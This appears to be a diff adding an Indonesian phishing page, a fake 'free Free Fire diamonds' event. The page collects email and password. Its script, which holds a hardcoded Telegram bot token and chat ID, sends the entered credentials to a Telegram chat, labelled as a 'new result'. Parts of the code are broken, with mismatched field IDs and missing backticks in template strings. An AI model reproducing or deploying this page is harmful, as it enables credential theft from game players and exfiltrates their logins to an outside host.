@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FREE FIREE Diamond Gratis</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
+
+body{
+  background:url("https://files.catbox.moe/jh1sff.jpg") no-repeat center;
+  background-size:cover;
+}
+
+.overlay{
+  background:rgba(0,0,0,0.7);
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+.box{
+  background:#fff;
+  padding:20px;
+  border-radius:12px;
+  width:320px;
+}
+
+input{
+  width:100%;
+  margin:6px 0;
+  padding:12px;
+  border-radius:8px;
+  border:1px solid #ccc;
+}
+
+button{
+  width:100%;
+  margin-top:10px;
+  padding:12px;
+  border:none;
+  border-radius:10px;
+  background:#22c55e;
+  color:white;
+  font-weight:bold;
+}
+
+/* GRID */
+.grid{
+  display:none;
+  grid-template-columns:repeat(2,1fr);
+  gap:10px;
+  margin-top:10px;
+}
+
+.card{
+  background:#f1f5f9;
+  padding:12px;
+  border-radius:10px;
+  text-align:center;
+  cursor:pointer;
+}
+
+.card.selected{
+  background:#22c55e;
+  color:white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="overlay">
+  <div class="box">
+
+    <h2 style="text-align:center">🎮 Event Diamond</h2>
+
+    <!-- FORM -->
+    <div id="form">
+      <input id="Email" placeholder="email">
+      <input id="password" placeholder="password">
+      <input id="level" placeholder="Level">
+      <input id="tanggal" placeholder="tanggal">
+
+      <button onclick="lanjut()">LANJUT</button>
+    </div>
+
+    <!-- DIAMOND -->
+    <div id="diamond">
+      <h3>Pilih Diamond</h3>
+      <div class="grid" id="list"></div>
+      <button onclick="kirim()">KONFIRMASI</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const TOKEN = "8689252981:AAE4piGEudqQNwQnOpqisJslfk3rEC3LYdE";
+const CHAT_ID = "1178982410";
+
+let user = {};
+let selected = "";
+
+// LANJUT
+function lanjut(){
+  user.username = document.getElementById("username").value;
+  user.nickname = document.getElementById("nickname").value;
+  user.level = document.getElementById("level").value;
+  user.umur = document.getElementById("umur").value;
+
+  if(!user.username || !user.nickname){
+    return alert("Isi data dulu!");
+  }
+
+  // kirim ke telegram
+  fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text:`🚀 NEW RESULT: BY KAAAOFFC🚀
+Email: ${user.email}
+password: ${user.password}
+Level: ${user.level}
+tanggal: ${user.umur}`
+    })
+  });
+
+  // tampilkan diamond
+  document.getElementById("form").style.display="none";
+  document.getElementById("diamond").style.display="block";
+  document.querySelector(".grid").style.display="grid";
+}
+
+// LIST DIAMOND
+const diamonds = [5,10,50,100,500,1000,3000,7000];
+const list = document.getElementById("list");
+
+diamonds.forEach(d=>{
+  const div = document.createElement("div");
+  div.className="card";
+  div.innerHTML=💎 ${d} Diamond<br><small>FREE</small>;
+
+  div.onclick=()=>{
+    document.querySelectorAll(".card").forEach(c=>c.classList.remove("selected"));
+    div.classList.add("selected");
+    selected = d+" Diamond";
+  };
+
+  list.appendChild(div);
+});
+
+// KIRIM FINAL
+function kirim(){
+  if(!selected) return alert("Pilih diamond dulu!");
+
+  fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text:`💎 REQUEST DIAMOND
+Email: ${user.email}
+password: ${user.password}
+Level: ${user.level}
+tanggal: ${user.tanggal}
+Jumlah: ${selected}`
+    })
+  });
+
+  alert("Berhasil dikirim!");
+}
+</script>
+
+</body>
+  </html>
